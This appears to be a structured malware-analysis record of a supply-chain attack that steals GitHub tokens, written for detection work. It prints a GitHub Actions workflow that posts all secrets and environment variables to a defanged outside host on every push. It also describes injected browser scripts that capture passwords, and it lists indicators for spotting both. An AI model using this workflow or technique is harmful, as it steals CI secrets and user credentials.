package_info.package_manager: Unknown (likely npm or PyPI, not specified)
package_info.why_malicious: The package is suspected to exfiltrate GitHub personal access tokens (PATs) from developer environments, enabling attackers to compromise GitHub accounts and inject further malicious code into repositories.

malicious_snippets.code_snippet:
name: hook
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Exfiltrate secrets
        run: |
          curl -X POST -d "${{ secrets }} ${{ github }} ${{ env }}" hxxps://send[.]wagateway.pro/webhook
malicious_snippets.code_behavior: On every push event, the workflow collects GitHub secrets, environment variables, and context, then sends them via HTTP POST to a remote C2 server, enabling credential exfiltration.

malice_analysis.why_suspicious: The workflow is designed solely to exfiltrate sensitive secrets and environment variables to an external server, which is never legitimate.
malice_analysis.violated_expectations: Normal GitHub Actions workflows automate CI/CD tasks, not exfiltrate secrets. This action is purely malicious.
malice_analysis.similar_legitimate_use: Legitimate workflows may send build status or logs to external services, but never secrets or environment variables in bulk.
key_indicators: Exfiltration of all secrets and environment variables
Workflow triggers on every push event

execution_context.trigger: runtime (browser execution of modified JavaScript files)
execution_context.file_location: Appended to all *.js files in compromised repositories

malicious_snippets.code_behavior: At runtime in the browser, the code injects a remote script from the attacker's server into the page, enabling further malicious actions such as credential theft.

malice_analysis.why_suspicious: Appending obfuscated script injection code to all JavaScript files is a classic web supply chain attack technique.
malice_analysis.violated_expectations: Normal JavaScript files should not dynamically load remote scripts from untrusted domains, especially not in all files.
malice_analysis.similar_legitimate_use: Dynamic script loading is used for analytics or feature toggles, but always from trusted, vetted domains.

execution_context.trigger: runtime (browser, after snippet_2 loads remote script)

malicious_snippets.code_behavior: At runtime in the browser, the loaded script intercepts password form submissions and sends user credentials to the attacker's C2 server.

malice_analysis.why_suspicious: Intercepting password forms and exfiltrating credentials is a direct credential theft technique.
malice_analysis.violated_expectations: Legitimate scripts should never capture and exfiltrate user credentials.
malice_analysis.similar_legitimate_use: Password managers may interact with forms, but never exfiltrate data to untrusted domains.
key_indicators: Sends credentials to external C2 server

behavioral_signatures: GitHub Actions workflows that POST secrets or environment variables to external domains
JavaScript files with appended obfuscated script injection lines
Dynamic loading of scripts from untrusted or newly registered domains
Browser scripts intercepting password form submissions and sending data externally
file_indicators: References to wagateway.pro in code or workflow files
detection_knowledge.how_to_detect: Monitor for new or modified GitHub Actions workflows that exfiltrate secrets or environment variables to external domains. Scan JavaScript files for appended script injection lines referencing untrusted domains. Detect network requests from CI/CD environments or browsers to wagateway.pro. Alert on browser scripts that intercept password forms and POST data externally.
